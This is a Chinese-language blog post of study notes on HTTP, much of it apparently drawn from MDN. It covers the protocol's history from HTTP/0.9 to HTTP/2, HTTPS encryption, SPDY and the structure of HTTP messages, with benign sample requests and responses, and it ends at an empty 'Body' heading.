---
layout: post
#标题配置
title:  网络协议
#时间配置
date:   2019-4-18 21:00:00 +0800
#大类配置
categories: document
#小类配置
tag: note base
---

* content
{:toc}








https://developer.mozilla.org/zh-CN/docs/Web/HTTP

# HTTP协议

- HTTP是一种能够获取如 HTML 这样的网络资源的 [protocol](https://developer.mozilla.org/en-US/docs/Glossary/protocol)(通讯协议)。
- 它是在 Web 上进行数据交换的基础，是一种 client-server 协议，也就是说，请求通常是由像**浏览器**这样的接受方发起的。一个完整的Web文档通常是由不同的子文档拼接而成的，像是文本、布局描述、图片、视频、脚本等等。
- ![1554012202994](F:\OneDrive\JS\assets\1554012202994.png) 
- 客户端和服务端通过交换各自的消息（与数据流正好相反）进行交互。由像浏览器这样的客户端发出的消息叫做 **requests**，被服务端响应的消息叫做 **responses**
- ![1554012213986](F:\OneDrive\JS\assets\1554012213986.png) 
- HTTP被设计于20世纪90年代初期，是一种可扩展的协议。它是应用层的协议，通过[TCP](https://developer.mozilla.org/en-US/docs/Glossary/TCP)，或者是[TLS](https://developer.mozilla.org/en-US/docs/Glossary/TLS)－加密的TCP连接来发送，理论上任何可靠的传输协议都可以使用。因为其良好的扩展性，时至今日，它不仅被用来传输超文本文档，还用来传输图片、视频或者向服务器发送如HTML表单这样的信息。HTTP还可以根据网页需求，仅获取部分Web文档内容更新网页。

## 基于HTTP的组件系统

- HTTP是一个client-server协议：请求通过一个实体被发出，实体也就是用户代理。大多数情况下，这个用户代理都是指浏览器，当然它也可能是任何东西，比如一个爬取网页生成维护搜索引擎索引的机器爬虫。
- 每一个发送到服务器的请求，都会被服务器处理并返回一个消息，也就是 response。在这个请求与响应之间，还有许许多多的被称为[proxies](https://developer.mozilla.org/zh-CN/docs/Glossary/Proxy)的实体，他们的作用与表现各不相同，比如有些是网关，还有些是[caches](https://developer.mozilla.org/en-US/docs/Glossary/Cache)等。
- ![1554012304165](F:\OneDrive\JS\assets\1554012304165.png) 
- 实际上，在一个浏览器和处理请求的服务器之间，还有路由器、调制解调器等许多计算机。由于Web的层次设计，那些在网络层和传输层的细节都被隐藏起来了。HTTP位于最上层的应用层。虽然底层对于分析网络问题非常重要，但是大多都跟对HTTP的描述不相干。

### 客户端：user-agent

- user-agent 就是任何能够为用户发起行为的工具。这个角色通常都是由浏览器来扮演。一些例外情况，比如是工程师使用的程序，以及Web开发人员调试应用程序。
- 浏览器**总是**作为发起一个请求的实体，他永远不是服务器（虽然近几年已经出现一些机制能够模拟由服务器发起的请求消息了）。
- 要展现一个网页，浏览器首先发送一个请求来获取页面的HTML文档，再解析文档中的资源信息发送其他请求，获取可执行脚本或CSS样式来进行页面布局渲染，以及一些其它页面资源（如图片和视频等）。然后，浏览器将这些资源整合到一起，展现出一个完整的文档，也就是网页。浏览器执行的脚本可以在之后的阶段获取更多资源，并相应地更新网页。
- 一个网页就是一个超文本文档。也就是说，有一部分显示的文本可能是链接，启动它（通常是鼠标的点击）就可以获取一个新的网页，使得用户可以控制客户端进行网上冲浪。浏览器来负责发送HTTP请求，并进一步解析HTTP返回的消息，以向用户提供明确的响应。

### Web服务端

- 在上述通信过程的另一端，是由Web Server来服务并提供客户端所请求的文档。Server只是虚拟意义上代表一个机器：它可以是共享负载（负载均衡）的一组服务器组成的计算机集群，也可以是一种复杂的软件，通过向其他计算机（如缓存，数据库服务器，电子商务服务器 ...）发起请求来获取部分或全部资源。
- Server 不一定是一台机器，但一个机器上可以装载的众多Servers。在HTTP/1.1 和[`Host`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Host)头部中，它们甚至可以共享同一个IP地址。

### 代理（Proxies）

- 在浏览器和服务器之间，有许多计算机和其他设备转发了HTTP消息。由于Web栈层次结构的原因，它们大多都出现在传输层、网络层和物理层上，对于HTTP应用层而言就是**透明**的，虽然它们可能会对应用层性能有重要影响。还有一部分是表现在应用层上的，被称为**代理（Proxies）**。代理（Proxies）既可以表现得透明，又可以不透明（“改变请求”会通过它们）。代理主要有如下几种作用：
  - 缓存（可以是公开的也可以是私有的，像浏览器的缓存）
  - 过滤（像反病毒扫描，家长控制...）
  - 负载均衡（让多个服务器服务不同的请求）
  - 认证（对不同资源进行权限管理）
  - 日志记录（允许存储历史信息）

## HTTP 的基本性质

### HTTP 是简单的

- 虽然下一代HTTP/2协议将HTTP消息封装到了帧（frames）中，HTTP大体上还是被设计得简单易读。HTTP报文能够被人读懂，还允许简单测试，降低了门槛，对新人很友好。

### HTTP是可扩展的

- 在 HTTP/1.0 中出现的 [HTTP headers](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers) 让协议扩展变得非常容易。只要服务端和客户端就新 headers 达成语义一致，新功能就可以被轻松加入进来。

### HTTP 是无状态，有会话的

- **HTTP是无状态的：在同一个连接中，两个执行成功的请求之间是没有关系的。**
- 这就带来了一个问题，用户没有办法在同一个网站中进行连续的交互，比如在一个电商网站里，用户把某个商品加入到购物车，切换一个页面后再次添加了商品，这两次添加商品的请求之间没有关联，浏览器无法知道用户最终选择了哪些商品。
- 而使用HTTP的头部扩展，**HTTP Cookies**就可以解决这个问题。把Cookies添加到头部中，创建一个会话让每次请求都能共享相同的上下文信息，达成相同的状态。
- **注意，HTTP本质是无状态的，使用Cookies可以创建有状态的会话。**

### HTTP 和连接

- 一个连接是由传输层来控制的，这从根本上不属于HTTP的范围。HTTP并不需要其底层的传输层协议是面向连接的，只需要它是可靠的，或不丢失消息的（至少返回错误）。在互联网中，有两个最常用的传输层协议：TCP是可靠的，而UDP不是。因此，HTTP依赖于面向连接的TCP进行消息传递，但连接并不是必须的。
- **HTTP/1.0为每一个请求/响应都打开一个TCP连接**，导致了2个缺点：
  - 打开一个TCP连接需要多次往返消息传递，因此速度慢。
  - 但当多个消息周期性发送时，这样就变得更加高效：**暖连接**比**冷连接**更高效。
- 为了减轻这些缺陷，HTTP/1.1引入了流水线（被证明难以实现）和长连接的概念：底层的TCP连接可以通过[`Connection`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Connection)头部来被部分控制。HTTP/2则发展得更远，通过在一个连接复用消息的方式来让这个连接始终保持为暖连接。 
- 为了更好的适合HTTP，设计一种更好传输协议的进程一直在进行。Google就研发了一种以UDP为基础，能提供更可靠更高效的传输协议[QUIC](https://en.wikipedia.org/wiki/QUIC)。

## HTTP 能控制什么

- 多年以来，HTTP良好的扩展性使得越来越多的Web功能归其控制。缓存和认证很早就可以由HTTP来控制了。另一方面，对同源同域的限制到2010年才有所改变。
- 以下是可以被HTTP控制的常见特性。
  - [缓存 ](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Caching)
    文档如何缓存能通过HTTP来控制。服务端能告诉代理和客户端哪些文档需要被缓存，缓存多久，而客户端也能够命令中间的缓存代理来忽略存储的文档。
  - 开放同源限制
    为了防止网络窥听和其它隐私泄漏，浏览器强制对Web网站做了分割限制。只有来自于**相同来源**的网页才能够获取网站的全部信息。这样的限制有时反而成了负担，HTTP可以通过修改头部来开放这样的限制，因此Web文档可以是由不同域下的信息拼接成的（某些情况下，这样做还有安全因素考虑）。
  - 认证
    一些页面能够被保护起来，仅让特定的用户进行访问。基本的认证功能可以直接通过HTTP提供，使用[`Authenticate`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Authenticate)相似的头部即可，或用HTTP Cookies来设置指定的会话。
  - 代理和隧道
    通常情况下，服务器和/或客户端是处于内网的，对外网隐藏真实 IP 地址。因此 HTTP 请求就要通过代理越过这个网络屏障。但并非所有的代理都是 HTTP 代理。例如，SOCKS协议的代理就运作在更底层，一些像 FTP 这样的协议也能够被它们处理。
  - 会话
    使用HTTP Cookies允许你用一个服务端的状态发起请求，这就创建了会话。虽然基本的HTTP是无状态协议。这很有用，不仅是因为这能应用到像购物车这样的电商业务上，更是因为这使得任何网站都能轻松为用户定制展示内容了。

# HTTP的发展

- **HTTP（**HyperText Transfer Protocol）是万维网（World Wide Web）的基础协议。自 Tim Berners-Lee 博士和他的团队在1989-1991年间创造出它以来，HTTP已经发生了太多的变化，在保持协议简单性的同时，不断扩展其灵活性。如今，HTTP已经从一个只在实验室之间交换文件的早期协议进化到了可以传输图片，高分辨率视频和3D效果的现代复杂互联网协议。

### 万维网的发明

- 1989年， 当时在 CERN 工作的 Tim Berners-Lee 博士写了一份关于建立一个通过网络传输超文本系统的报告。这个系统起初被命名为 *Mesh*，在随后的1990年项目实施期间被更名为万维网（*World Wide Web）。*它在现有的TCP和IP协议基础之上建立，由四个部分组成：
  - 一个用来表示超文本文档的文本格式，超文本标记语言（HTML）。
  - 一个用来交换超文本文档的简单协议，超文本传输协议（HTTP）。
  - 一个显示（以及编辑）超文本文档的客户端，即网络浏览器。第一个网络浏览器被称为 *WorldWideWeb。*
  - 一个服务器用于提供可访问的文档，即 httpd 的前身。
- 这四个部分完成于1990年底，且第一批服务器已经在1991年初在CERN以外的地方运行了。 1991年8月16日，Tim Berners-Lee 在公开的超文本新闻组上发表的文章被视为是万维网公共项目的开始。
- HTTP在应用的早期阶段非常简单，后来被称为HTTP/0.9，有时也叫做单行（one-line）协议。

### HTTP/0.9 – 单行协议

- 最初版本的HTTP协议并没有版本号，后来它的版本号被定位在 0.9 以区分后来的版本。 HTTP/0.9 极其简单：请求由单行指令构成，以唯一可用方法[`GET`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/GET)开头，其后跟目标资源的路径（一旦连接到服务器，协议、服务器、端口号这些都不是必须的）。

  ```html
  GET /mypage.html
  ```

- 响应也极其简单的：只包含响应文档本身。

  ```html
  <HTML>
  这是一个非常简单的HTML页面
  </HTML>
  ```

- 跟后来的版本不同，HTTP/0.9 的响应内容并不包含HTTP头，这意味着只有HTML文件可以传送，无法传输其他类型的文件；也没有状态码或错误代码：一旦出现问题，一个特殊的包含问题描述信息的HTML文件将被发回，供人们查看。

### HTTP/1.0 – 构建可扩展性

- 由于 HTTP/0.9 协议的应用十分有限，浏览器和服务器迅速扩展内容使其用途更广：

  - 协议版本信息现在会随着每个请求发送（`HTTP/1.0`被追加到了`GET`行）。
  - 状态码会在响应开始时发送，使浏览器能了解请求执行成功或失败，并相应调整行为（如更新或使用本地缓存）。
  - 引入了HTTP头的概念，无论是对于请求还是响应，允许传输元数据，使协议变得非常灵活，更具扩展性。
  - 在新HTTP头的帮助下，具备了传输除纯文本HTML文件以外其他类型文档的能力（感谢[`Content-Type`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Type)头）。

- 一个典型的请求看起来就像这样：

  ```
  GET /mypage.html HTTP/1.0
  User-Agent: NCSA_Mosaic/2.0 (Windows 3.1)
  
  200 OK
  Date: Tue, 15 Nov 1994 08:12:31 GMT
  Server: CERN/3.0 libwww/2.17
  Content-Type: text/html
  
  <HTML> 
  一个包含图片的页面
    <IMG SRC="/myimage.gif">
  </HTML>
  ```

- 接下来是第二个连接，请求获取图片：

  ```html
  GET /myimage.gif HTTP/1.0
  User-Agent: NCSA_Mosaic/2.0 (Windows 3.1)
  
  200 OK
  Date: Tue, 15 Nov 1994 08:12:32 GMT
  Server: CERN/3.0 libwww/2.17
  Content-Type: text/gif
  (这里是图片内容)
  ```

- 在1991-1995年，这些新扩展并没有被引入到标准中以促进协助工作，而仅仅作为一种尝试：服务器和浏览器添加这些新扩展功能，但出现了大量的互操作问题。直到1996年11月，为了解决这些问题，一份新文档（RFC 1945）被发表出来，用以描述如何操作实践这些新扩展功能。文档 RFC 1945 定义了 HTTP/1.0，但它是狭义的，并不是官方标准。

### HTTP/1.1 – 标准化的协议

- HTTP/1.0 多种不同的实现方式在实际运用中显得有些混乱，自1995年开始，即HTTP/1.0文档发布的下一年，就开始修订HTTP的第一个标准化版本。在1997年初，HTTP1.1 标准发布，就在HTTP/1.0 发布的几个月后。

- HTTP/1.1 消除了大量歧义内容并引入了多项改进：

  - 连接可以复用，节省了多次打开TCP连接加载网页文档资源的时间。
  - 增加流水线操作，允许在第一个应答被完全发送之前就发送第二个请求，以降低通信延迟。
  - 支持响应分块。
  - 引入额外的缓存控制机制。
  - 引入内容协商机制，包括语言，编码，类型等，并允许客户端和服务器之间约定以最合适的内容进行交换。
  - 感谢[`Host`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Host)头，能够使不同域名配置在同一个IP地址的服务器上。

- 一个典型的请求流程， 所有请求都通过一个连接实现，看起来就像这样：

  ```html
  GET /en-US/docs/Glossary/Simple_header HTTP/1.1
  Host: developer.mozilla.org
  User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:50.0) Gecko/20100101 Firefox/50.0
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate, br
  Referer: https://developer.mozilla.org/en-US/docs/Glossary/Simple_header
  
  200 OK
  Connection: Keep-Alive
  Content-Encoding: gzip
  Content-Type: text/html; charset=utf-8
  Date: Wed, 20 Jul 2016 10:55:30 GMT
  Etag: "547fa7e369ef56031dd3bff2ace9fc0832eb251a"
  Keep-Alive: timeout=5, max=1000
  Last-Modified: Tue, 19 Jul 2016 00:59:33 GMT
  Server: Apache
  Transfer-Encoding: chunked
  Vary: Cookie, Accept-Encoding
  
  (content)
  
  
  GET /static/img/header-background.png HTTP/1.1
  Host: developer.cdn.mozilla.net
  User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:50.0) Gecko/20100101 Firefox/50.0
  Accept: */*
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate, br
  Referer: https://developer.mozilla.org/en-US/docs/Glossary/Simple_header
  
  200 OK
  Age: 9578461
  Cache-Control: public, max-age=315360000
  Connection: keep-alive
  Content-Length: 3077
  Content-Type: image/png
  Date: Thu, 31 Mar 2016 13:34:46 GMT
  Last-Modified: Wed, 21 Oct 2015 18:27:50 GMT
  Server: Apache
  
  (image content of 3077 bytes)
  ```

- HTTP/1.1 在1997年1月以 [RFC 2068](https://tools.ietf.org/html/rfc2068) 文件发布。

### 超过15年的扩展

- 由于HTTP协议的可扩展性 – 创建新的头部和方法是很容易的 – 即使HTTP/1.1协议进行过两次修订，[RFC 2616](https://tools.ietf.org/html/rfc2616) 发布于1999年6月，而另外两个文档 [RFC 7230](https://tools.ietf.org/html/rfc7230)-[RFC 7235](https://tools.ietf.org/html/rfc7235) 发布于2014年6月，作为HTTP/2的预览版本。HTTP协议已经稳定使用超过15年了。

### HTTP 用于复杂应用

- Tim Berners-Lee 对于 Web 的最初设想不是一个只读媒体。 他设想一个 Web 是可以远程添加或移动文档，是一种分布式文件系统。 大约 1996 年，HTTP 被扩展到允许创作，并且创建了一个名为 WebDAV 的标准。 它进一步扩展了某些特定的应用程序，如 CardDAV 用来处理地址簿条目，CalDAV 用来处理日历。 但所有这些 *DAV 扩展有一个缺陷：它们必须由要使用的服务器来实现，这是非常复杂的。并且他们在网络领域的使用必须保密。
- 在 2000 年，一种新的使用 HTTP 的模式被设计出来：[representational state transfer](https://developer.mozilla.org/en-US/docs/Glossary/REST) (或者说 REST)。 由 API 发起的操作不再通过新的 HTTP 方法传达，而只能通过使用基本的 HTTP / 1.1 方法访问特定的 URI。 这允许任何 Web 应用程序通过提供 API 以允许查看和修改其数据，而无需更新浏览器或服务器：all what is needed was embedded in the files served by the Web sites through standard HTTP/1.1。  REST 模型的缺点在于每个网站都定义了自己的非标准 RESTful API，并对其进行了全面的控制；不同于 *DAV 扩展，客户端和服务器是可互操作的。 RESTful API 在 2010 年变得非常流行。
- 自 2005 年以来，可用于 Web 页面的 API 大大增加，其中几个 API 为特定目的扩展了 HTTP 协议，大部分是新的特定 HTTP 头：
  - [Server-sent events](https://developer.mozilla.org/en-US/docs/Web/API/Server-sent_events)，服务器可以偶尔推送消息到浏览器。
  - [WebSocket](https://developer.mozilla.org/en-US/docs/Web/API/WebSocket_API)，一个新协议，可以通过升级现有 HTTP 协议来建立。

### 放松Web的安全模型

- HTTP和Web安全模型--[同源策略](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)是互不相关的。事实上，当前的Web安全模型是在HTTP被创造出来后才被发展的！这些年来，已经证实了它如果能通过在特定的约束下移除一些这个策略的限制来管的宽松些的话，将会更有用。这些策略导致大量的成本和时间被花费在通过转交到服务端来添加一些新的HTTP头来发送。这些被定义在了[Cross-Origin Resource Sharing](https://developer.mozilla.org/en-US/docs/Glossary/CORS) (CORS) or the [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/Security/CSP) (CSP)规范里。
- 不只是这大量的扩展，很多的其他的头也被加了进来，有些只是实验性的。比较著名的有Do Not Track ([`DNT`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/DNT)) 来控制隐私，[`X-Frame-Options`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/X-Frame-Options), 还有很多。

## HTTPS

- HTTP 有以下安全性问题：
  1. 使用明文进行通信，内容可能会被窃听；
  2. 不验证通信方的身份，通信方的身份有可能遭遇伪装；
  3. 无法证明报文的完整性，报文有可能遭篡改。

### HTTP 用于安全传输

- HTTP最大的变化发生在1994年底。HTTP在基本的TCP/IP协议栈上发送信息，网景公司（Netscape Communication）在此基础上创建了一个额外的**加密传输层**：SSL 。SSL 1.0没有在公司以外发布过，但SSL 2.0及其后继者SSL 3.0和SSL 3.1允许通过加密来保证服务器和客户端之间交换消息的真实性，来创建电子商务网站。SSL在标准化道路上最终成为TLS,随着版本1.0, 1.1, 1.2的出现成功地关闭漏洞。TLS 1.3 目前正在形成。
- 与此同时，人们对一个加密传输层的需求也愈发高涨：因为 Web 最早几乎是一个学术网络，相对信任度很高，但如今不得不对面一个险恶的丛林：广告客户、随机的个人或者犯罪分子争相劫取个人信息，将信息占为己有，甚至改动将要被传输的数据。随着通过HTTP构建的应用程序变得越来越强大，可以访问越来越多的私人信息，如地址簿，电子邮件或用户的地理位置，即使在电子商务使用之外，对TLS的需求也变得普遍。
- HTTPS可以理解为 HTTP+SSL/TLS， 即 HTTP 下加入 SSL 层，HTTPS 的安全基础是 SSL，因此加密的详细内容就需要 SSL，用于安全的 HTTP 数据传输。
- **HTTPS 并不是新协议**，而是让 HTTP 先和 SSL（Secure Sockets Layer）通信，再由 SSL 和 TCP 通信。也就是说 HTTPS 使用了隧道进行通信。
- 通过使用 SSL，HTTPs 具有了加密（防窃听）、认证（防伪装）和完整性保护（防篡改）

### 对称秘钥加密和非对称秘钥加密

#### 对称密钥加密

- 对称密钥加密（Symmetric-Key Encryption），加密的加密和解密使用同一密钥。

- 优点：运算速度快； 缺点：密钥容易被获取。

#### 公开密钥加密

- 公开密钥加密（Public-Key Encryption），也称为非对称密钥加密，使用一对密钥用于加密和解密，分别为公开密钥和私有密钥。公开密钥所有人都可以获得，通信发送方获得接收方的公开密钥之后，就可以使用公开密钥进行加密，接收方收到通信内容后使用私有密钥解密。

- 优点：更为安全； 缺点：运算速度慢；

### 混合加密机制

- HTTPS 采用混合的加密机制，使用公开密钥加密用于传输对称密钥来保证安全性，之后使用对称密钥加密进行通信来保证效率。
- ![img](F:\OneDrive\JS\assets\16385537a57214fe)

### HTTPS性能问题

- HTTPS 降低用户访问速度。SSL握手，HTTPS 对速度会有一定程度的降低，但是只要经过合理优化和部署，HTTPS 对速度的影响完全可以接受。在很多场景下，HTTPS 速度完全不逊于 HTTP，如果使用 SPDY，HTTPS 的速度甚至还要比 HTTP 快。
- 相对于HTTPS降低访问速度，其实更需要关心的是服务器端的CPU压力，HTTPS中大量的密钥算法计算，会消耗大量的CPU资源，只有足够的优化，HTTPS 的机器成本才不会明显增加。

### 使用SPDY

- 2012年google如一声惊雷提出了SPDY的方案，大家才开始从正面看待和解决老版本HTTP协议本身的问题，SPDY可以说是综合了HTTPS和HTTP两者有点于一体的传输协议，主要解决：

  1. 降低延迟，针对HTTP高延迟的问题，SPDY优雅的采取了**多路复用（multiplexing）**。多路复用通过多个请求stream共享一个tcp连接的方式，解决了HOL blocking的问题，降低了延迟同时提高了带宽的利用率。

  2. 请求优先级（request prioritization）。多路复用带来一个新的问题是，在连接共享的基础之上有可能会导致关键请求被阻塞。SPDY允许给每个request设置优先级，这样重要的请求就会优先得到响应。比如浏览器加载首页，首页的html内容应该优先展示，之后才是各种静态资源文件，脚本文件等加载，这样可以保证用户能第一时间看到网页内容。

  3. header压缩。前面提到HTTP1.x的header很多时候都是重复多余的。选择合适的压缩算法可以减小包的大小和数量。

  4. 基于HTTPS的加密协议传输，大大提高了传输数据的可靠性。

  5. 服务端推送（server push），采用了SPDY的网页，例如我的网页有一个sytle.css的请求，在客户端收到sytle.css数据的同时，服务端会将sytle.js的文件推送给客户端，当客户端再次尝试获取sytle.js时就可以直接从缓存中获取到，不用再发请求了。SPDY构成图：

     ![img](F:\OneDrive\JS\assets\16385537a58f4bf2)

- https://juejin.im/entry/5b036950518825428630cfe5

## HTTP2/ - 为了更优异的表现

- HTTP2.0可以说是SPDY的升级版（其实原本也是基于SPDY设计的），但是，HTTP2.0 跟 SPDY 仍有不同的地方，主要是以下两点：
  - HTTP2.0 支持明文 HTTP 传输，而 SPDY 强制使用 HTTPS
  - HTTP2.0 消息头的压缩算法采用 HPACK，而非 SPDY 采用的 DEFLATE
- 这些年来，网页愈渐变得的复杂，甚至演变成了独有的应用，可见媒体的播放量，增进交互的脚本大小也增加了许多：更多的数据通过HTTP请求被传输。HTTP/1.1链接需要请求以正确的顺序发送，理论上可以用一些并行的链接（尤其是5到8个），带来的成本和复杂性堪忧。比如，HTTP流水线就成为了Web开发的负担。
- 在2010年到2015年，谷歌通过实践了一个实验性的SPDY协议，证明了一个在客户端和服务器端交换数据的另类方式。其收集了浏览器和服务器端的开发者的焦点问题。明确了响应数量的增加和解决复杂的数据传输，SPDY成为了HTTP/2协议的基础。
- HTTP/2在HTTP/1.1有几处基本的不同:
  - HTTP/2是**二进制协议**而不是文本协议。不再可读，也不可无障碍的手动创建，改善的优化技术现在可被实施。
  - 这是一个**复用协议**。并行的请求能在同一个链接中处理，移除了HTTP/1.x中顺序和阻塞的约束。
  - **压缩了headers**。因为headers在一系列请求中常常是相似的，其移除了重复和传输重复数据的成本。
  - 其允许服务器在客户端缓存中填充数据，通过一个叫**服务器推送的机制来提前请求**。
- 在2015年5月正式标准化后，HTTP/2取得了极大的成功，在2016年7月前，8.7%的站点已经在使用它，代表超过68%的请求[[2\]](https://www.keycdn.com/blog/http2-statistics/) 。高流量的站点最迅速的普及，在数据传输上节省了可观的成本和支出。
- 这种迅速的普及率很可能是因为HTTP2不需要站点和应用做出改变：**使用HTTP/1.1和HTTP/2对他们来说是透明的。**拥有一个最新的服务器和新点的浏览器进行交互就足够了。只有一小部分群体需要做出改变，而且随着陈旧的浏览器和服务器的更新，而不需Web开发者做什么，用的人自然就增加了。

### 后HTTP/2进化

- 随着HTTP/2.的发布，就像先前的HTTP/1.x一样，HTTP没有停止进化，HTTP的扩展性依然被用来添加新的功能。特别的，我们能列举出2016年里HTTP的新扩展：
  - 对Alt-Svc的支持允许了给定资源的位置和资源鉴定，允许了更智能的CDN缓冲机制。
  - [`Client-Hints`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Client-Hints) 的引入允许浏览器或者客户端来主动交流它的需求，或者是硬件约束的信息给服务端。
  - 在Cookie头中引入安全相关的的前缀，现在帮助保证一个安全的cookie没被更改过。
- HTTP的进化证实了它良好的扩展性和简易性，释放了很多应用程序的创造力并且情愿使用这个协议。今天的HTTP的使用环境已经于早期1990年代大不相同。HTTP的原先的设计不负杰作之名，允许了Web在25年间和平稳健得发展。修复漏洞，同时却也保留了使HTTP如此成功的灵活性和扩展性，HTTP/2的普及也预示着这个协议的大好前程。

# HTTP消息

+ HTTP消息是服务器和客户端之间交换数据的方式。有两种类型的消息︰ 请求--由客户端发送用来触发一个服务器上的动作；响应--来自服务器的应答。

+ HTTP消息由采用ASCII编码的多行文本构成。在HTTP/1.1及早期版本中，这些消息通过连接公开地发送。在HTTP/2中，为了优化和性能方面的改进，曾经可人工阅读的消息被分到多个HTTP帧中。

+ Web 开发人员或网站管理员，很少自己手工创建这些原始的HTTP消息︰ 由软件、浏览器、 代理或  服务器完成。他们通过配置文件（用于代理服务器或服务器），API （用于浏览器）或其他接口提供HTTP消息。  

+ ![From a user-, script-, or server- generated event, an HTTP/1.x msg is generated, and if HTTP/2 is in use, it is binary framed into an HTTP/2 stream, then sent.](F:\OneDrive\JS\assets\HTTPMsg2.png) 
+ HTTP/2二进制框架机制被设计为不需要改动任何API或配置文件即可应用︰ 它大体上对用户是透明的。
+ HTTP 请求和响应具有相似的结构，由以下部分组成︰
  1. 一行起始行用于描述要执行的请求，或者是对应的状态，成功或失败。这个起始行总是单行的。
  2. 一个可选的HTTP头集合指明请求或描述消息正文。
  3. 一个空行指示所有关于请求的元数据已经发送完毕。
  4. 一个可选的包含请求相关数据的正文 (比如HTML表单内容), 或者响应相关的文档。 正文的大小有起始行的HTTP头来指定。
+ 起始行和  HTTP 消息中的HTTP 头统称为请求头，而其有效负载被称为消息正文。
+ ![Requests and responses share a common structure in HTTP](F:\OneDrive\JS\assets\HTTPMsgStructure2.png) 

## HTTP 请求

+ HTTP Headers https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers
+ **逐跳消息头**
  + 这类消息头仅对单次传输连接有意义，不能通过代理或缓存进行重新转发。这些消息头包括 [`Connection`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Connection), [`Keep-Alive`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Keep-Alive), [`Proxy-Authenticate`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Proxy-Authenticate), [`Proxy-Authorization`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Proxy-Authorization), [`TE`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/TE), [`Trailer`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Trailer), [`Transfer-Encoding`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Transfer-Encoding) 及 [`Upgrade`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Upgrade)。注意，只能使用 [`Connection`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Connection) 来设置逐跳一般头。
+ HTTP 请求方法 https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods
  + HEAD CONNECT OPTIONS

### 起始行

+ HTTP请求是由客户端发出的消息，用来使服务器执行动作。*起始行 (start-line)* 包含三个元素：

1. 一个 *HTTP 方法*，一个动词 (像 [`GET`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/GET), [`PUT`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/PUT) 或者 [`POST`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/POST)) 或者一个名词 (像 [`HEAD`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/HEAD) 或者 [`OPTIONS`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/OPTIONS)), 描述要执行的动作. 例如, `GET` 表示要获取资源，`POST` 表示向服务器推送数据 (创建或修改资源, 或者产生要返回的临时文件)。

2. 请求目标 (request target)，通常是一个URL，或者是协议、端口和域名的绝对路径，通常以请求的环境为特征。请求的格式因不同的 HTTP 方法而异。它可以是：

   - 一个绝对路径，末尾跟上一个 ' ? ' 和**查询字符串**。这是最常见的形式，称为 **原始形式 (origin form)**，被 GET，POST，HEAD 和 OPTIONS 方法所使用。

     ```js
     POST / HTTP 1.1
     GET /background.png HTTP/1.0
     HEAD /test.html?query=alibaba HTTP/1.1
     OPTIONS /anypage.html HTTP/1.0
     ```

   - 一个完整的URL，被称为 **绝对形式 (absolute form)**，主要在 GET 连接到代理时使用。
     `GET http://developer.mozilla.org/en-US/docs/Web/HTTP/Messages HTTP/1.1`

   - 由域名和可选端口（以`':'`为前缀）组成的 URL 的 authority component，称为 **authority form**。 仅在使用 CONNECT 建立 HTTP 隧道时才使用。
     `CONNECT developer.mozilla.org:80 HTTP/1.1`

   - **星号形式 (asterisk form)**，一个简单的星号`('*')`，配合 OPTIONS 方法使用，代表整个服务器。
     `OPTIONS * HTTP/1.1`

3. **HTTP 版本 (HTTP version*)***，定义了剩余报文的结构，作为对期望的响应版本的指示符。

### Headers

+ 来自请求的 [HTTP headers](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers) 遵循和 HTTP header 相同的基本结构：不区分大小写的字符串，紧跟着的冒号 `(':')` 和一个结构取决于 header 的值。 整个 header（包括值）由一行组成，这一行可以相当长。
+ 有许多请求头可用，它们可以分为几组：
  + **General headers**，例如 [`Via`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Via)，适用于整个报文。
  + **Request headers**，例如 [`User-Agent`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/User-Agent)，[`Accept-Type`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Accept-Type)，通过进一步的定义(例如 [`Accept-Language`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Accept-Language))，或者给定上下文(例如 [`Referer`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Referer))，或者进行有条件的限制 (例如 [`If-None`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/If-None)) 来修改请求。
  + **Entity headers**，例如 [`Content-Length`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Length)，适用于请求的 body。显然，如果请求中没有任何 body，则不会发送这样的头文件。
+ ![Example of headers in an HTTP request](F:\OneDrive\JS\assets\HTTP_Request_Headers2.png)

### Body

